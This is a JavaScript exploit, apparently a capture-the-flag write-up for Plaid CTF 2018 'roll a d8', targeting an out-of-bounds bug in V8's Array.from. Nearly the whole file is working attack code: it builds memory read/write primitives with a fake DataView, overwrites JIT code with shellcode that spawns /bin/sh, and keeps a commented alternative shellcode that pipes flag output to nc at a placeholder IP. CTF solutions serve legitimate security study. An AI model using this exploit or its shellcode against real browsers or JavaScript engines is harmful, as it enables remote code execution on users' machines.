// Plaid CTF 2018
// roll a d8 Write-up
// 2018. 05. 06 
// Written by UKnowY
//
// reference:
// https://github.com/theori-io/zer0con2018_bpak/blob/master/code/exploit.js
// https://cs.chromium.org/chromium/src/v8/test/mjsunit/regress/regress-821137.js
var f64 = new Float64Array(1);
var u32 = new Uint32Array(f64.buffer);
function d2u(v) {
    f64[0] = v;
    return u32;
}
function u2d(lo, hi) {
    u32[0] = lo;
    u32[1] = hi;
    return f64[0];
}

var double_arr = [1.1, 2.2, 3.3];
var boxed_arr = [0x13371337, 0xcafe, {}, new Function("eval('')")]
// execute /bin/sh
var shellcode = [0xbb48c031, 0x91969dd1, 0xff978cd0, 0x53dbf748, 0x52995f54, 0xb05e5457, 0x50f3b]
// ./run_me_for_flag| nc [IP] 3434 (shellcode by junorouse)
// var shellcode=[0xb848686a,0x6e69622f,0x732f2f2f,0xe7894850,0x101b848,0x1010101,0x48500101,0x353221b8,0x1013532,0x4314801,0xIPb84824,0xIPIPIPIP,0x50IPIPIP,0x6e20b848,0xIPIP2063,0x4850IPIP,0x5f726fb8,0x67616c66,0xb848507c,0x5f6e7572,0x665f656d,0x1b84850,0x1010101,0x50010101,0x6972b848,0x1622c01,0x31482e2f,0xf6312404,0x5e0e6a56,0x56e60148,0x485e136a,0x6a56e601,0x1485e18,0x894856e6,0x6ad231e6,0x50f583b]

function makeOOB(arr) {
  let maxSize = 1028 * 4;
  Array.from.call(function() { return arr }, {[Symbol.iterator] : _ => (
    {
      counter : 0,
      next() {
        let result = this.counter++;
        if (this.counter > maxSize) {
          arr.length = 0;
          return {done: true};
        } else {
          return {value: result, done: false};
        }
      }
    }
  ) });
  return arr
}

// unboxed/boxed arrays point same address
var unboxed = makeOOB(double_arr);
var boxed = makeOOB(boxed_arr);
console.log("[+] make oob array good")

// job [DataView Map Address]
var fake_map_obj = [
    u2d(0, 0),
    u2d(0, 0x0d000439),
    u2d(0, 0),
    u2d(0, 0),

    /* Fake ArrayBuffer object */
    u2d(0, 0),
    u2d(0, 0),
    u2d(0, 0),
    u2d(0, 0),
    u2d(0x43434343, 0x44444444),
    u2d(0x43434343, 0x44444444),
    u2d(0, 0),
    u2d(0, 0),
    u2d(0, 0),      
    u2d(0, 0),
].slice(0);

boxed[boxed.length-2] = fake_map_obj
fake_map_lo = d2u(unboxed[unboxed.length-2])[0]
fake_map_hi = d2u(unboxed[unboxed.length-2])[1] 
fake_map_lo -= 0x71; // ?
console.log("[+] fake_map: 0x" + fake_map_hi.toString(16) + fake_map_lo.toString(16));

var func_obj = Array.prototype.map;
boxed[boxed.length-2] = func_obj;
func_lo = d2u(unboxed[unboxed.length-2])[0] 
func_hi = d2u(unboxed[unboxed.length-2])[1] 
console.log("[+] func: 0x" + func_hi.toString(16) + func_lo.toString(16));

// job [DataView Object Address]
var fake_dv_obj = [
    u2d(fake_map_lo + 1, fake_map_hi),
    u2d(0, 0),
    u2d(0, 0),
    u2d(fake_map_lo + 0x20 + 1, fake_map_hi),
    u2d(0, 0),
    u2d(0, 0x4000),
].slice(0);

boxed[boxed.length-2] = fake_dv_obj;
var fake_dv_lo = d2u(unboxed[unboxed.length-2])[0] 
var fake_dv_hi = d2u(unboxed[unboxed.length-2])[1] 
fake_dv_lo -= 0x31;
console.log("[+] fake_dv: 0x" + fake_dv_hi.toString(16) + fake_dv_lo.toString(16));

unboxed[unboxed.length-2] = u2d(fake_dv_lo + 1, fake_dv_hi);
var dv = boxed[boxed.length-2]

fake_map_obj[8] = u2d(func_lo + 6 * 8 - 1, func_hi);
let jit_lo = DataView.prototype.getUint32.call(dv, 0, true) + 0x60;
let jit_hi = DataView.prototype.getUint32.call(dv, 4, true);
console.log("[+] jit: 0x" + jit_hi.toString(16) + jit_lo.toString(16))

fake_map_obj[8] = u2d(jit_lo - 1, jit_hi);
for (let k = 0; k < shellcode.length; ++k) {
    DataView.prototype.setUint32.call(dv, k * 4, shellcode[k], true);
}

console.log("[*] Execute Shellcode")
func_obj();
// Flag: PCTF{k33p_c4lm_4nd_53c0nd_w1nd}